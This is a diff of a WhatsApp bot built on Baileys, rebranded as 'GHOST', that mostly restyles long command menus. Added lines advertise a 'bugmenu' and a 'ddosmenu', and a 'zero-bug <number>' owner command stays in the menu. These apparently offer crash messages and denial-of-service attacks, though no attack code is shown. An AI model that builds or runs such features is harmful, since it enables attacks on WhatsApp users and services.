-┃✢ Type : Case
-┃✢ Status : Ready
-┃✢ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
-┃✢ User : ${Object.keys(db.data.users).length}
-┃✢ Prefix : Single 
-┗❐
+╭❐  ⌜ 𝐆𝐇𝐎𝐒𝐓 - Bot ⌟  ❐
+│⭔ Creator : 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆
+│⭔ Library : WS-Baileys
+│⭔ Type : Case
+│⭔ Status : Ready
+│⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
+│⭔ User : ${Object.keys(db.data.users).length}
+│⭔ Prefix : Single 
+╰❐
 
-❐${prefix}spesialmenu
-❐${prefix}allmenu
-❐${prefix}changemenu button/non
-❐${prefix}owner
-❐${prefix}botstatus
-
-𝐂𝐥𝐚𝐬𝐬𝐢𝐜 © Copyright`
+╭❐  \`Main Menu\`
+│
+│⭔${prefix}bugmenu
+│⭔${prefix}ddosmenu
+│⭔${prefix}allmenu
+│⭔${prefix}changemenu button/non
+│⭔${prefix}owner
+│⭔${prefix}botstatus
+│
+╰❐
+`
 
 //Button Menu
 let freesex = {
@@ -1959,25 +2129,66 @@ interactiveMessage: {
 },
 },
 "header": {
-"title": penisbengkok,
-...(await prepareWAMessageMedia({ image: mengkece }, { upload: ryozingod.waUploadToServer })),
+"title": "    *[ 😈🧛‍♂️ ]  •  𝐆𝐇𝐎𝐒𝐓*",
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
 "hasMediaAttachment": true
 },
 "body": {
 "text": ""
 },
 "footer": {
-"text": "⿻  ⌜ Zero Execution Vault ⌟  ⿻"
+"text": "*# 𝐆𝐇𝐎𝐒𝐓 Execution Vault - 2k24*"
 },
 "nativeFlowMessage": {
 "buttons": [
 {
 "name": "single_select",
-"buttonParamsJson": `{ "title": "⿻🕸️𝕾𝖕𝖎𝖉𝖊𝖗🕷️⿻", "sections": [{ "title": "# !-Choose One Of Them", "highlight_label": "🌏General Commands🗨️", "rows": [{ "header": "ALL COMMAND", "title": "Show All Command", "id": ".allmenu" }, { "header": "Owner", "title": "Displays Owner Number", "id": ".owner" }, { "header": "Bot Info", "title": "Displays Information About Bots", "id": ".botstatus" }] }, { "title": "🦠 SpeCiaL - ComManD ❌", "highlight_label": " #SpeCial ", "rows": [{ "header": "Special - Menu", "title": "displays all special commands", "id": ".spesialmenu" }] }] }`
+"buttonParamsJson": `{
+"title": "🦠 SEE ALL MENU 🎩",
+"sections": [
+{
+"title": "👾 Choose One Of Them ⭐",
+"highlight_label": "#General",
+"rows": [
+{
+"header": "[ ❇️ ] • ALL CMD",
+"title": "❗Show All Command",
+"id": ".allmenu"
+},
+{
+"header": "👤 - CONTACT THE OWNER",
+"title": "❗Displays Owner Number",
+"id": ".owner"
+},
+{
+"header": "🖥️ - Bot Info",
+"title": "❗Displays Information About Bots",
+"id": ".botstatus"
+}
+]
+},
+{
+"title": "🍷 SUPERIOR COMMAND ♦️",
+"highlight_label": "#FRONT",
+"rows": [
+{
+"header": "🎩 - BUG MENU ‼️",
+"title": "❗Displays All Bug Commands",
+"id": ".bugmenu"
+},
+{
+"header": "🔗 - DDOS MENU 📥",
+"title": "❗Displays All Ddos",
+"id": ".ddosmenu"
+}
+]
+}
+]
+}`
 },
 {
 "name": "cta_url",
-"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e\",\"merchant_url\":\"https://whatsapp.com/channel/0029VadBczKI1rcayqzQ2n0e\"}"
+"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4\",\"merchant_url\":\"https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4\"}"
 }
 ],
 "messageParamsJson": ""
@@ -1985,459 +2196,478 @@ interactiveMessage: {
 }
 }
 }
-};
+}
 
-let kontollurus = {
-image: mengkece,
-caption: njing,
-contextInfo:{externalAdReply:{
-title: '🕷️𝕾𝖕𝖎𝖉𝖊𝖗 𝖂𝖊𝖇🕸️',
-body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
-showAdAttribution: true,
-thumbnail: mydick,
-mediaType: 4,
-MediaUrl:`${global.yt}`,
-sourceUrl:`${global.yt}`,
-}}
-};
+//Button Penis
+let youarebemydick = {
+viewOnceMessage: {
+message: {
+interactiveMessage: {
+"contextInfo": {
+"mentionedJid": [m.sender],
+"isForwarded": true,
+"forwardedNewsletterMessageInfo": {
+"newsletterJid": '0@newsletter',
+"newsletterName": 'By Zero Execution Vault',
+"serverMessageId": 1
+},
+},
+"header": {
+"title": njing,
+...(await prepareWAMessageMedia({ image: overlaid }, { upload: ryozingod.waUploadToServer })),
+"hasMediaAttachment": true
+},
+"body": {
+"text": ""
+},
+"footer": {
+"text": "*# Zero Execution Vault - 2k24*"
+},
+"nativeFlowMessage": {
+"buttons": [
+{ "name": "cta_url", "buttonParamsJson": `{ display_text : '🎩 𝐙𝐞𝐫𝐨 𝐗𝐯❗', url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4", merchant_url : "https://chat.whatsapp.com/KsZgSGIMpzj7lT845IibW4" }`}
+],
+"messageParamsJson": ""
+}
+}
+}
+}
+}
 
-if ( db.data.settings[botNumber].menuType === 'externalImage') {
-ryozingod.sendMessage(m.chat, kontollurus, { quoted: m })
+if ( db.data.settings[botNumber].menuType === 'imageIos') {
+ryozingod.relayMessage(m.chat, youarebemydick, {});
 } else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
-ryozingod.relayMessage(m.chat, freesex, {})
+ryozingod.relayMessage(m.chat, freesex, {});
 }
 
 }
 break
 //=================================================//
 case "allmenu": case "allcmd": {
-let jinjing = [nulll, nulll2]
-let randomIndex = Math.floor(Math.random() * jinjing.length)
-let mydick = jinjing[randomIndex]
 let itsmenu = `
-┏❐  ⌜ 𝗗𝗘𝗩𝗜𝗟 𝗦𝗣𝗜𝗗𝗘𝗥⌟  ❐
-┃✢ Creator : 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒
-┃✢ Library : WS-Baileys
-┃✢ Type : Case
-┃✢ Status : Ready
-┃✢ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
-┃✢ User : ${Object.keys(db.data.users).length}
-┃✢ Prefix : Single 
-┗❐
+  *[ 🧛‍♂️😈 ]  •  𝐆𝐇𝐎𝐒𝐓*
+
+⭔ Creator : 𝐉𝐅𝐋𝐄𝐗 𝐎𝐆
+⭔ Library : WS-Baileys
+⭔ Type : Case
+⭔ Status : Ready
+⭔ Mode : ${ryozingod.public ? '✱ Public ༣' : '✲ Self ༣'}
+⭔ User : ${Object.keys(db.data.users).length}
+⭔ Prefix : Single 
  
-┏❐   \`Owner Cmd\` 
-┃
-┃✢ ${prefix}Addprem 62##/TAG 30d
-┃✢ ${prefix}Dellprem 62##/TAG 30d
-┃✢ ${prefix}addowner 62878####
-┃✢ ${prefix}delowner 62878####
-┃✢ ${prefix}zero-bug 62878####
-┃✢ ${prefix}addbadwords kata kasar
-┃✢ ${prefix}delbadwords kata kasar
-┃✢ ${prefix}changemenu button/non
-┃✢ ${prefix}autoread on/off
-┃✢ ${prefix}autotyping on/off
-┃✢ ${prefix}autorecord on/off
-┃✢ ${prefix}autobio on/off
-┃✢ ${prefix}self
-┃✢ ${prefix}public
-┃✢ ${prefix}shutdown
-┃✢ ${prefix}addcase 
-┃✢ ${prefix}delcase
-┃✢ ${prefix}join [link group]
-┃✢ ${prefix}block [nomor]
-┃✢ ${prefix}unblock [nomor]
-┃✢ ${prefix}listblock
-┃✢ ${prefix}setppbot [reply gambar]
-┃✢ ${prefix}setbiobot [teks]
-┃✢ ${prefix}listpc
-┃
-┗❐
+╭❐   \`Owner Cmd\` 
+│
+│⭔ ${prefix}Addprem 62##/TAG 30d
+│⭔ ${prefix}Dellprem 62##/TAG 30d
+│⭔ ${prefix}addowner 62878####
+│⭔ ${prefix}delowner 62878####
+│⭔ ${prefix}zero-bug 62878####
+│⭔ ${prefix}addbadwords kata kasar
+│⭔ ${prefix}delbadwords kata kasar
+│⭔ ${prefix}changemenu button/non
+│⭔ ${prefix}autoread on/off
+│⭔ ${prefix}autotyping on/off
+│⭔ ${prefix}autorecord on/off
+│⭔ ${prefix}autobio on/off
+│⭔ ${prefix}self
+│⭔ ${prefix}public
+│⭔ ${prefix}shutdown
+│⭔ ${prefix}addcase 
+│⭔ ${prefix}delcase
+│⭔ ${prefix}join [link group]
+│⭔ ${prefix}block [nomor]
+│⭔ ${prefix}unblock [nomor]
+│⭔ ${prefix}listblock
+│⭔ ${prefix}setppbot [reply gambar]
+│⭔ ${prefix}setbiobot [teks]
+│⭔ ${prefix}listpc
+│
+╰❐
 
-┏❐   \`Rpg Menu\` 
-┃
-┃✢ ${prefix}kerja 
-┃✢ ${prefix}bankcek 
-┃✢ ${prefix}maling 
-┃✢ ${prefix}banknabung 
-┃✢ ${prefix}banktarik 
-┃✢ ${prefix}berkebon 
-┃✢ ${prefix}crafting 
-┃✢ ${prefix}bet 
-┃✢ ${prefix}bonus 
-┃✢ ${prefix}buah 
-┃✢ ${prefix}nebang 
-┃✢ ${prefix}bekerja 
-┃✢ ${prefix}bansos 
-┃✢ ${prefix}taxy 
-┃✢ ${prefix}mulung 
-┃✢ ${prefix}berburu 
-┃✢ ${prefix}polisi 
-┃✢ ${prefix}berdagang 
-┃✢ ${prefix}rampok 
-┃✢ ${prefix}bunuh 
-┃✢ ${prefix}collect 
-┃✢ ${prefix}mancing 
-┃✢ ${prefix}repair 
-┃✢ ${prefix}feed 
-┃✢ ${prefix}fight 
-┃✢ ${prefix}gajian 
-┃✢ ${prefix}upgrade 
-┃✢ ${prefix}transfer 
-┃✢ ${prefix}shop 
-┃✢ ${prefix}selectskill 
-┃✢ ${prefix}sampah 
-┃✢ ${prefix}roket 
-┃✢ ${prefix}ojek 
-┃✢ ${prefix}nguli 
-┃✢ ${prefix}pasar 
-┃✢ ${prefix}rob 
-┃✢ ${prefix}referal 
-┃✢ ${prefix}petshop 
-┃✢ ${prefix}kolam 
-┃✢ ${prefix}koboy 
-┃✢ ${prefix}leaderboard 
-┃
-┗❐ 
+╭❐   \`Rpg Menu\` 
+│
+│⭔ ${prefix}kerja 
+│⭔ ${prefix}bankcek 
+│⭔ ${prefix}maling 
+│⭔ ${prefix}banknabung 
+│⭔ ${prefix}banktarik 
+│⭔ ${prefix}berkebon 
+│⭔ ${prefix}crafting 
+│⭔ ${prefix}bet 
+│⭔ ${prefix}bonus 
+│⭔ ${prefix}buah 
+│⭔ ${prefix}nebang 
+│⭔ ${prefix}bekerja 
+│⭔ ${prefix}bansos 
+│⭔ ${prefix}taxy 
+│⭔ ${prefix}mulung 
+│⭔ ${prefix}berburu 
+│⭔ ${prefix}polisi 
+│⭔ ${prefix}berdagang 
+│⭔ ${prefix}rampok 
+│⭔ ${prefix}bunuh 
+│⭔ ${prefix}collect 
+│⭔ ${prefix}mancing 
+│⭔ ${prefix}repair 
+│⭔ ${prefix}feed 
+│⭔ ${prefix}fight 
+│⭔ ${prefix}gajian 
+│⭔ ${prefix}upgrade 
+│⭔ ${prefix}transfer 
+│⭔ ${prefix}shop 
+│⭔ ${prefix}selectskill 
+│⭔ ${prefix}sampah 
+│⭔ ${prefix}roket 
+│⭔ ${prefix}ojek 
+│⭔ ${prefix}nguli 
+│⭔ ${prefix}pasar 
+│⭔ ${prefix}rob 
+│⭔ ${prefix}referal 
+│⭔ ${prefix}petshop 
+│⭔ ${prefix}kolam 
+│⭔ ${prefix}koboy 
+│⭔ ${prefix}leaderboard 
+│
+╰❐ 
 
-┏❐   \`Convert\` 
-┃
-┃✢ ${prefix}toimg | reply stiker
-┃✢ ${prefix}toaudio | reply video
-┃✢ ${prefix}sticker | reply gambar
-┃✢ ${prefix}s | reply gambar 
-┃✢ ${prefix}smeme teks bawah|teks atas
-┃✢ ${prefix}tomp4 (sedang eror)
-┃✢ ${prefix}kalkulator 
-┃✢ ${prefix}removebg | reply gambar
-┃✢ ${prefix}wm | reply stiker
-┃✢ ${prefix}attp teks
-┃✢ ${prefix}styletext teks
-┃
-┗❐ 
+╭❐   \`Convert\` 
+│
+│⭔ ${prefix}toimg | reply stiker
+│⭔ ${prefix}toaudio | reply video
+│⭔ ${prefix}sticker | reply gambar
+│⭔ ${prefix}s | reply gambar 
+│⭔ ${prefix}smeme teks bawah|teks atas
+│⭔ ${prefix}tomp4 (sedang eror)
+│⭔ ${prefix}kalkulator 
+│⭔ ${prefix}removebg | reply gambar
+│⭔ ${prefix}wm | reply stiker
+│⭔ ${prefix}attp teks
+│⭔ ${prefix}styletext teks
+│
+╰❐ 
 
-┏❐   \`OpenAi\` 
-┃
-┃✢ ${prefix}ai query
-┃✢ ${prefix}prompt-gpt query
-┃✢ ${prefix}dall-e Ilustrasi 
-┃✢ ${prefix}gptgo query
-┃✢ ${prefix}c-ai query|query
-┃✢ ${prefix}stablediffusion ilustrasi
-┃✢ ${prefix}gpt4 query
-┃
-┗❐ 
+╭❐   \`OpenAi\` 
+│
+│⭔ ${prefix}ai query
+│⭔ ${prefix}prompt-gpt query
+│⭔ ${prefix}dall-e Ilustrasi 
+│⭔ ${prefix}gptgo query
+│⭔ ${prefix}c-ai query|query
+│⭔ ${prefix}stablediffusion ilustrasi
+│⭔ ${prefix}gpt4 query
+│
+╰❐ 
  
-┏❐   \`Search\` 
-┃
-┃✢ ${prefix}google-article query
-┃✢ ${prefix}google-search query
-┃✢ ${prefix}search-kbbi query
-┃✢ ${prefix}search-apk query
-┃✢ ${prefix}search-resep
-┃✢ ${prefix}search-sticker
-┃
-┗❐ 
+╭❐   \`Search\` 
+│
+│⭔ ${prefix}google-article query
+│⭔ ${prefix}google-search query
+│⭔ ${prefix}search-kbbi query
+│⭔ ${prefix}search-apk query
+│⭔ ${prefix}search-resep
+│⭔ ${prefix}search-sticker
+│
+╰❐ 
 
-┏❐   \`Voice\` 
-┃
-┃✢ ${prefix}Bass ReplyAudio
-┃✢ ${prefix}Blown ReplyAudio
-┃✢ ${prefix}Deep ReplyAudio
-┃✢ ${prefix}Earrape ReplyAudio
-┃✢ ${prefix}Fast ReplyAudio
-┃✢ ${prefix}Fat ReplyAudio
-┃✢ ${prefix}Nightcore ReplyAudio
-┃✢ ${prefix}Reverse ReplyAudio
-┃✢ ${prefix}Robot ReplyAudio
-┃✢ ${prefix}Slow ReplyAudio
-┃✢ ${prefix}Tupai ReplyAudio
-┃
-┗❐ 
+╭❐   \`Voice\` 
+│
+│⭔ ${prefix}Bass ReplyAudio
+│⭔ ${prefix}Blown ReplyAudio
+│⭔ ${prefix}Deep ReplyAudio
+│⭔ ${prefix}Earrape ReplyAudio
+│⭔ ${prefix}Fast ReplyAudio
+│⭔ ${prefix}Fat ReplyAudio
+│⭔ ${prefix}Nightcore ReplyAudio
+│⭔ ${prefix}Reverse ReplyAudio
+│⭔ ${prefix}Robot ReplyAudio
+│⭔ ${prefix}Slow ReplyAudio
+│⭔ ${prefix}Tupai ReplyAudio
+│
+╰❐ 
 
-┏❐   \`Islamic\` 
-┃
-┃✢ ${prefix}kisahnabi
-┃✢ ${prefix}asmaulhusna
-┃✢ ${prefix}bacaansholat
-┃✢ ${prefix}ayatkursi
-┃✢ ${prefix}doaharian
-┃✢ ${prefix}niatsholat
-┃✢ ${prefix}quotesislami
-┃✢ ${prefix}doatahlil
-┃
-┗❐ 
+╭❐   \`Islamic\` 
+│
+│⭔ ${prefix}kisahnabi
+│⭔ ${prefix}asmaulhusna
+│⭔ ${prefix}bacaansholat
+│⭔ ${prefix}ayatkursi
+│⭔ ${prefix}doaharian
+│⭔ ${prefix}niatsholat
+│⭔ ${prefix}quotesislami
+│⭔ ${prefix}doatahlil
+│
+╰❐ 
 
-┏❐   \`Group\` 
-┃
-┃✢ ${prefix}setppgroup reply gambar
-┃✢ ${prefix}promote tag
-┃✢ ${prefix}demote tag
-┃✢ ${prefix}kick tag
-┃✢ ${prefix}add nomor
-┃✢ ${prefix}editgroup open/close
-┃✢ ${prefix}editsubjek teks 
-┃✢ ${prefix}editinfo teks
-┃✢ ${prefix}editdesk teks
-┃✢ ${prefix}clearchat
-┃✢ ${prefix}resetlinkgc
-┃✢ ${prefix}revoke
-┃✢ ${prefix}infogc
-┃✢ ${prefix}getppgc
-┃✢ ${prefix}closegroup
-┃✢ ${prefix}opengroup
-┃✢ ${prefix}hidetag
-┃✢ ${prefix}tagsubject
-┃✢ ${prefix}tagall
-┃✢ ${prefix}linkgc
-┃✢ ${prefix}antitoxic on / off
-┃✢ ${prefix}antiasing on / off
-┃✢ ${prefix}antivirtex on / off
-┃✢ ${prefix}antilinkall on / off
-┃✢ ${prefix}antilinkfb on / off
-┃✢ ${prefix}antilinkyt on / off
-┃✢ ${prefix}antilinkytch on / off
-┃✢ ${prefix}antilinkig on / off
-┃✢ ${prefix}antilinktele on / off
-┃✢ ${prefix}antilinktiktok on / off
-┃✢ ${prefix}antilinktwitter on / off
-┃✢ ${prefix}antilink on / off
-┃
-┗❐ 
+╭❐   \`Group\` 
+│
+│⭔ ${prefix}setppgroup reply gambar
+│⭔ ${prefix}promote tag
+│⭔ ${prefix}demote tag
+│⭔ ${prefix}kick tag
+│⭔ ${prefix}add nomor
+│⭔ ${prefix}editgroup open/close
+│⭔ ${prefix}editsubjek teks 
+│⭔ ${prefix}editinfo teks
+│⭔ ${prefix}editdesk teks
+│⭔ ${prefix}clearchat
+│⭔ ${prefix}resetlinkgc
+│⭔ ${prefix}revoke
+│⭔ ${prefix}infogc
+│⭔ ${prefix}getppgc
+│⭔ ${prefix}closegroup
+│⭔ ${prefix}opengroup
+│⭔ ${prefix}hidetag
+│⭔ ${prefix}tagsubject
+│⭔ ${prefix}tagall
+│⭔ ${prefix}linkgc
+│⭔ ${prefix}antitoxic on / off
+│⭔ ${prefix}antiasing on / off
+│⭔ ${prefix}antivirtex on / off
+│⭔ ${prefix}antilinkall on / off
+│⭔ ${prefix}antilinkfb on / off
+│⭔ ${prefix}antilinkyt on / off
+│⭔ ${prefix}antilinkytch on / off
+│⭔ ${prefix}antilinkig on / off
+│⭔ ${prefix}antilinktele on / off
+│⭔ ${prefix}antilinktiktok on / off
+│⭔ ${prefix}antilinktwitter on / off
+│⭔ ${prefix}antilink on / off
+│
+╰❐ 
 
-┏❐   \`Download\` 
-┃
-┃✢ ${prefix}gitclone url
-┃✢ ${prefix}mediafire url
-┃✢ ${prefix}tiktokmp3 url
-┃✢ ${prefix}tiktokvideo url
-┃✢ ${prefix}ytmp4 url
-┃✢ ${prefix}ytmp3 url
-┃✢ ${prefix}play judul
-┃✢ ${prefix}playmusic judul
-┃✢ ${prefix}douyindl url
-┃✢ ${prefix}igdlimage url
-┃✢ ${prefix}igdlmp4 url
-┃✢ ${prefix}pintmp4 url
-┃✢ ${prefix}happymod nama apk
-┃
-┗❐ 
+╭❐   \`Download\` 
+│
+│⭔ ${prefix}gitclone url
+│⭔ ${prefix}mediafire url
+│⭔ ${prefix}tiktokmp3 url
+│⭔ ${prefix}tiktokvideo url
+│⭔ ${prefix}ytmp4 url
+│⭔ ${prefix}ytmp3 url
+│⭔ ${prefix}play judul
+│⭔ ${prefix}playmusic judul
+│⭔ ${prefix}douyindl url
+│⭔ ${prefix}igdlimage url
+│⭔ ${prefix}igdlmp4 url
+│⭔ ${prefix}pintmp4 url
+│⭔ ${prefix}happymod nama apk
+│
+╰❐ 
 
-┏❐   \`Fun Random\`
-┃
-┃✢ ${prefix}apakah
-┃✢ ${prefix}bisakah
-┃✢ ${prefix}bagaimanakah
-┃✢ ${prefix}gantengcek
-┃✢ ${prefix}cekganteng
-┃✢ ${prefix}cantikcek
-┃✢ ${prefix}cekcantik
-┃✢ ${prefix}sangecek
-┃✢ ${prefix}ceksange
-┃✢ ${prefix}gaycek
-┃✢ ${prefix}cekgay
-┃✢ ${prefix}lesbicek
-┃✢ ${prefix}ceklesbi
-┃✢ ${prefix}kapankah
-┃✢ ${prefix}wangy
-┃✢ ${prefix}cekmati
-┃
-┗❐ 
+╭❐   \`Fun Random\`
+│
+│⭔ ${prefix}apakah
+│⭔ ${prefix}bisakah
+│⭔ ${prefix}bagaimanakah
+│⭔ ${prefix}gantengcek
+│⭔ ${prefix}cekganteng
+│⭔ ${prefix}cantikcek
+│⭔ ${prefix}cekcantik
+│⭔ ${prefix}sangecek
+│⭔ ${prefix}ceksange
+│⭔ ${prefix}gaycek
+│⭔ ${prefix}cekgay
+│⭔ ${prefix}lesbicek
+│⭔ ${prefix}ceklesbi
+│⭔ ${prefix}kapankah
+│⭔ ${prefix}wangy
+│⭔ ${prefix}cekmati
+│
+╰❐ 
 
-┏❐   \`Fun Game\` 
-┃
-┃✢ ${prefix}tictactoe
-┃✢ ${prefix}suitpvp
-┃✢ ${prefix}kuismath
-┃✢ ${prefix}tebak gambar
-┃✢ ${prefix}tebak kata
-┃✢ ${prefix}tebak kalimat
-┃✢ ${prefix}tebak lirik
-┃✢ ${prefix}tebak tebakan
-┃✢ ${prefix}tebak bendera
-┃✢ ${prefix}tebak bendera2
-┃✢ ${prefix}tebak kabupaten
-┃✢ ${prefix}tebak kimia
-┃✢ ${prefix}tebak asahotak
-┃✢ ${prefix}tebak siapakahaku
-┃✢ ${prefix}tebak susunkata
-┃✢ ${prefix}tebak tekateki
-┃
-┗❐ 
+╭❐   \`Fun Game\` 
+│
+│⭔ ${prefix}tictactoe
+│⭔ ${prefix}suitpvp
+│⭔ ${prefix}kuismath
+│⭔ ${prefix}tebak gambar
+│⭔ ${prefix}tebak kata
+│⭔ ${prefix}tebak kalimat
+│⭔ ${prefix}tebak lirik
+│⭔ ${prefix}tebak tebakan
+│⭔ ${prefix}tebak bendera
+│⭔ ${prefix}tebak bendera2
+│⭔ ${prefix}tebak kabupaten
+│⭔ ${prefix}tebak kimia
+│⭔ ${prefix}tebak asahotak
+│⭔ ${prefix}tebak siapakahaku
+│⭔ ${prefix}tebak susunkata
+│⭔ ${prefix}tebak tekateki
+│
+╰❐ 
 
-┏❐   \`PhotoOxy\` 
-┃
-┃✢ ${prefix}shadow name 
-┃✢ ${prefix}write name 
-┃✢ ${prefix}romantic name 
-┃✢ ${prefix}burnpaper name
-┃✢ ${prefix}smoke name 
-┃✢ ${prefix}narutobanner name 
-┃✢ ${prefix}love name 
-┃✢ ${prefix}undergrass name
-┃✢ ${prefix}doublelove name 
-┃✢ ${prefix}coffecup name
-┃✢ ${prefix}underwaterocean name
-┃✢ ${prefix}smokyneon name
-┃✢ ${prefix}starstext name
-┃✢ ${prefix}rainboweffect name
-┃✢ ${prefix}balloontext name
-┃✢ ${prefix}metalliceffect name
-┃✢ ${prefix}embroiderytext name
-┃✢ ${prefix}flamingtext name
-┃✢ ${prefix}stonetext name
-┃✢ ${prefix}writeart name
-┃✢ ${prefix}summertext name
-┃✢ ${prefix}wolfmetaltext name
-┃✢ ${prefix}nature3dtext name
-┃✢ ${prefix}rosestext name
-┃✢ ${prefix}naturetypography name
-┃✢ ${prefix}quotesunder name
-┃✢ ${prefix}shinetext name
-┃
-┗❐ 
+╭❐   \`PhotoOxy\` 
+│
+│⭔ ${prefix}shadow namalu 
+│⭔ ${prefix}write namalu 
+│⭔ ${prefix}romantic namalu 
+│⭔ ${prefix}burnpaper namalu
+│⭔ ${prefix}smoke namalu 
+│⭔ ${prefix}narutobanner namalu 
+│⭔ ${prefix}love namalu 
+│⭔ ${prefix}undergrass namalu
+│⭔ ${prefix}doublelove namalu 
+│⭔ ${prefix}coffecup namalu
+│⭔ ${prefix}underwaterocean namalu
+│⭔ ${prefix}smokyneon namalu
+│⭔ ${prefix}starstext namalu
+│⭔ ${prefix}rainboweffect namalu
+│⭔ ${prefix}balloontext namalu
+│⭔ ${prefix}metalliceffect namalu
+│⭔ ${prefix}embroiderytext namalu
+│⭔ ${prefix}flamingtext namalu
+│⭔ ${prefix}stonetext namalu
+│⭔ ${prefix}writeart namalu
+│⭔ ${prefix}summertext namalu
+│⭔ ${prefix}wolfmetaltext namalu
+│⭔ ${prefix}nature3dtext namalu
+│⭔ ${prefix}rosestext namalu
+│⭔ ${prefix}naturetypography namalu
+│⭔ ${prefix}quotesunder namalu
+│⭔ ${prefix}shinetext namalu
+│
+╰❐ 
 
-┏❐   \`Panel\` 
-┃
-┃✢ ${prefix}delsrv
-┃✢ ${prefix}delusr
-┃✢ ${prefix}addsrv
-┃✢ ${prefix}listram
-┃✢ ${prefix}listsrv
-┃✢ ${prefix}listusr
-┃
-┗❐ 
+╭❐   \`Panel\` 
+│
+│⭔ ${prefix}delsrv
+│⭔ ${prefix}delusr
+│⭔ ${prefix}addsrv
+│⭔ ${prefix}listram
+│⭔ ${prefix}listsrv
+│⭔ ${prefix}listusr
+│
+╰❐ 
 
-┏❐   \`Fun Primbon\` 
-┃
-┃✢ ${prefix}Nomorhoki
-┃✢ ${prefix}Artimimpi
-┃✢ ${prefix}Artinama
-┃✢ ${prefix}Ramaljodoh
-┃✢ ${prefix}Ramalcinta
-┃✢ ${prefix}Ramaljodohbali
-┃✢ ${prefix}Suamiistri
-┃✢ ${prefix}Cocoknama
-┃✢ ${prefix}Pasangan
-┃✢ ${prefix}Jadiannikah
-┃✢ ${prefix}Sifatusaha
-┃✢ ${prefix}Rezeki
-┃✢ ${prefix}Pekerjaan
-┃✢ ${prefix}Nasib
-┃✢ ${prefix}Penyakit
-┃✢ ${prefix}Tarot
-┃✢ ${prefix}Fengshui
-┃✢ ${prefix}Haribaik
-┃✢ ${prefix}Harisangar
-┃✢ ${prefix}Harisial
-┃✢ ${prefix}Nagahari
-┃✢ ${prefix}Arahrezeki
-┃✢ ${prefix}Peruntungan
-┃✢ ${prefix}Weton
-┃✢ ${prefix}Karakter
-┃✢ ${prefix}Keberuntungan
-┃✢ ${prefix}Masasubur
-┃✢ ${prefix}Memancing
-┃✢ ${prefix}Zodiak
-┃✢ ${prefix}Shio
-┃
-┗❐ 
+╭❐   \`Fun Primbon\` 
+│
+│⭔ ${prefix}Nomorhoki
+│⭔ ${prefix}Artimimpi
+│⭔ ${prefix}Artinama
+│⭔ ${prefix}Ramaljodoh
+│⭔ ${prefix}Ramalcinta
+│⭔ ${prefix}Ramaljodohbali
+│⭔ ${prefix}Suamiistri
+│⭔ ${prefix}Cocoknama
+│⭔ ${prefix}Pasangan
+│⭔ ${prefix}Jadiannikah
+│⭔ ${prefix}Sifatusaha
+│⭔ ${prefix}Rezeki
+│⭔ ${prefix}Pekerjaan
+│⭔ ${prefix}Nasib
+│⭔ ${prefix}Penyakit
+│⭔ ${prefix}Tarot
+│⭔ ${prefix}Fengshui
+│⭔ ${prefix}Haribaik
+│⭔ ${prefix}Harisangar
+│⭔ ${prefix}Harisial
+│⭔ ${prefix}Nagahari
+│⭔ ${prefix}Arahrezeki
+│⭔ ${prefix}Peruntungan
+│⭔ ${prefix}Weton
+│⭔ ${prefix}Karakter
+│⭔ ${prefix}Keberuntungan
+│⭔ ${prefix}Masasubur
+│⭔ ${prefix}Memancing
+│⭔ ${prefix}Zodiak
+│⭔ ${prefix}Shio
+│
+╰❐ 
 
-┏❐   \`Scrape\` 
-┃
-┃✢ ${prefix}akira
-┃✢ ${prefix}akiyama
-┃✢ ${prefix}ana
-┃✢ ${prefix}asuna
-┃✢ ${prefix}ayuzawa
-┃✢ ${prefix}boruto
-┃✢ ${prefix}chitoge
-┃✢ ${prefix}deidara
-┃✢ ${prefix}doraemon
-┃✢ ${prefix}elaina
-┃✢ ${prefix}emilia
-┃✢ ${prefix}erza
-┃✢ ${prefix}gremory
-┃✢ ${prefix}hestia
-┃✢ ${prefix}hinata
-┃✢ ${prefix}inori
-┃✢ ${prefix}isuzu
-┃✢ ${prefix}itachi
-┃✢ ${prefix}itori
-┃✢ ${prefix}kaga
-┃✢ ${prefix}kagura
-┃✢ ${prefix}kakasih
-┃✢ ${prefix}kaori
-┃✢ ${prefix}keneki
-┃✢ ${prefix}kotori
-┃✢ ${prefix}kurumi
-┃✢ ${prefix}madara
-┃✢ ${prefix}mikasa
-┃✢ ${prefix}miku
-┃✢ ${prefix}minato
-┃✢ ${prefix}naruto
-┃✢ ${prefix}nezuko
-┃✢ ${prefix}onepiece
-┃✢ ${prefix}pokemon
-┃✢ ${prefix}rize
-┃✢ ${prefix}sagiri
-┃✢ ${prefix}sakura
-┃✢ ${prefix}sasuke
-┃✢ ${prefix}shina
-┃✢ ${prefix}shinka
-┃✢ ${prefix}shizuka
-┃✢ ${prefix}shota
-┃✢ ${prefix}toukachan
-┃✢ ${prefix}tsunade
-┃✢ ${prefix}yukiyuki
-┃
-┗❐ 
+╭❐   \`Scrape\` 
+│
+│⭔ ${prefix}akira
+│⭔ ${prefix}akiyama
+│⭔ ${prefix}ana
+│⭔ ${prefix}asuna
+│⭔ ${prefix}ayuzawa
+│⭔ ${prefix}boruto
+│⭔ ${prefix}chitoge
+│⭔ ${prefix}deidara
+│⭔ ${prefix}doraemon
+│⭔ ${prefix}elaina
+│⭔ ${prefix}emilia
+│⭔ ${prefix}erza
+│⭔ ${prefix}gremory
+│⭔ ${prefix}hestia
+│⭔ ${prefix}hinata
+│⭔ ${prefix}inori
+│⭔ ${prefix}isuzu
+│⭔ ${prefix}itachi
+│⭔ ${prefix}itori
+│⭔ ${prefix}kaga
+│⭔ ${prefix}kagura
+│⭔ ${prefix}kakasih
+│⭔ ${prefix}kaori
+│⭔ ${prefix}keneki
+│⭔ ${prefix}kotori
+│⭔ ${prefix}kurumi
+│⭔ ${prefix}madara
+│⭔ ${prefix}mikasa
